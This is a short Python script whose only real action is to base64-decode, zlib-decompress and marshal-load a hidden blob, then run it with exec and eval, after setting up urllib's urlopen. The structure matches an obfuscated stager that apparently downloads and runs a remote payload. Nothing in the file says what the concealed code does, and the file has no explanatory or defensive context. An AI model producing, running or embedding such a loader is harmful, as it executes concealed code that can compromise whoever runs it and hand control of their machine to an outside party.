import sys,zlib,base64,marshal,json,urllib
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode('eJwrtmFgYCgtyskvSM3TUM8oKSmw0tc3NDfRNTHTNbS00DU0MbUyNDa20NcvLklMTy0q1i8yMdMrqFTX1CtKTUzR0AQAS3ASEg==')))))